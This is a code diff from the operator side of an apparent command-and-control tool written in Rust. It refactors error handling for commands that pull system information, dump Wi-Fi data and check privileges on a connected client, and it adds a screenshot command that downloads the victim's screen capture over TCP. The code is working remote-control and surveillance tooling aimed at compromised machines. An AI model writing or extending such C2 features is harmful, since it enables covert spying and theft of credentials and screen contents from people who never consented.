@@ -1,10 +1,15 @@
-use crate::constants::{CYAN, DIM, GREEN, RED, RESET, WHITE, YELLOW};
+use crate::{
+    c2_state::C2State,
+    commands::client::filesystem,
+    constants::{CYAN, DIM, GREEN, RED, RESET, WHITE, YELLOW},
+};
 use shared::{
     BoxLevel, ClientMessage, Display, InstructMessage, Privilege, SystemInformation,
     utils::{get_flag_value, read_message, send_message},
 };
 use std::net::TcpStream;
 
+// ---- Sysinfo ---------------------------
 fn pretty_print_sysinfo(info: &SystemInformation) {
     fn opt(value: &Option<String>) -> &str {
         value.as_deref().unwrap_or("unknown")
@@ -126,17 +131,21 @@ pub fn sysinfo(conn: &mut TcpStream) -> Result<bool, String> {
         ClientMessage::SystemInformation(info) => {
             pretty_print_sysinfo(&info);
         }
-        ClientMessage::Error(err) => {
-            println!("client error: {err}");
-        }
+        ClientMessage::Error(e) => {
+            println!("\n\t{DIM}[{RESET}{RED}err:sysinfo{RESET}{DIM}]{RESET} {YELLOW}{}{RESET}\n", e);
+            return Err(e)
+        },
         _ => {
-            println!("unexpected client message");
+            println!("\n\t{DIM}[{RESET}{RED}err:sysinfo{RESET}{DIM}]{RESET} {YELLOW}Response not recognized{RESET}\n");
+            return Err("unknown response mensage".to_string()); 
         }
     }
 
     Ok(true)
 }
+// ---- Sysinfo ---------------------------
 
+// ---- WifiDump ---------------------------
 pub fn wifidump(conn: &mut TcpStream) -> Result<bool, String> {
     let msg = InstructMessage::WifiDump;
     match send_message(conn, &msg) {
@@ -160,17 +169,21 @@ pub fn wifidump(conn: &mut TcpStream) -> Result<bool, String> {
             }
             println!();
         }
-        ClientMessage::Error(err) => {
-            println!("client error: {err}");
-        }
+        ClientMessage::Error(e) => {
+            println!("\n\t{DIM}[{RESET}{RED}err:wifidump{RESET}{DIM}]{RESET} {YELLOW}{}{RESET}\n", e);
+            return Err(e)
+        },
         _ => {
-            println!("unexpected client message");
+            println!("\n\t{DIM}[{RESET}{RED}err:wifidump{RESET}{DIM}]{RESET} {YELLOW}Response not recognized{RESET}\n");
+            return Err("unknown response mensage".to_string()); 
         }
     }
 
     Ok(true)
 }
+// ---- WifiDump ---------------------------
 
+// ---- Check ---------------------------
 pub fn check_permissions(conn: &mut TcpStream) -> Result<bool, String> {
     let msg = InstructMessage::Check;
     match send_message(conn, &msg) {
@@ -201,7 +214,9 @@ pub fn check_permissions(conn: &mut TcpStream) -> Result<bool, String> {
         }
     }
 }
+// ---- Check ---------------------------
 
+// ---- Display ---------------------------
 pub fn display(instruct: &[&str], conn: &mut TcpStream) -> Result<bool, String> {
     let instruct = instruct.join(" ");
     let args = shell_words::split(&instruct).map_err(|e| e.to_string())?;
@@ -249,3 +264,36 @@ pub fn display(instruct: &[&str], conn: &mut TcpStream) -> Result<bool, String> 
 
     Ok(true)
 }
+// ---- Display ---------------------------
+
+// ---- Screenshot ---------------------------
+pub fn screenshot(conn: &mut TcpStream, state: &C2State) -> Result<bool, String> {
+    match send_message(conn, &InstructMessage::Screenshot) {
+        Ok(_) => (),
+        Err(e) => {
+            println!(
+                "\n\t{DIM}[{RESET}{RED}screenshot{RESET}{DIM}]{RESET} {YELLOW}{}{RESET}\n",
+                e
+            );
+            return Ok(true);
+        }
+    };
+
+    let msg: ClientMessage = read_message(conn).map_err(|e| e.to_string())?;
+
+    match msg {
+        ClientMessage::Screenshot(path) => {
+            filesystem::download_file(path, true, conn, state)
+        }
+        ClientMessage::Error(e) => {
+            println!("\n\t{DIM}[{RESET}{RED}err:screenshot{RESET}{DIM}]{RESET} {YELLOW}{}{RESET}\n", e);
+            return Err(e)
+        },
+        _ => {
+            println!("\n\t{DIM}[{RESET}{RED}err:screenshot{RESET}{DIM}]{RESET} {YELLOW}Response not recognized{RESET}\n");
+            return Err("unknown response mensage".to_string()); 
+        }
+    }
+}
+
+// ---- Screenshot ---------------------------
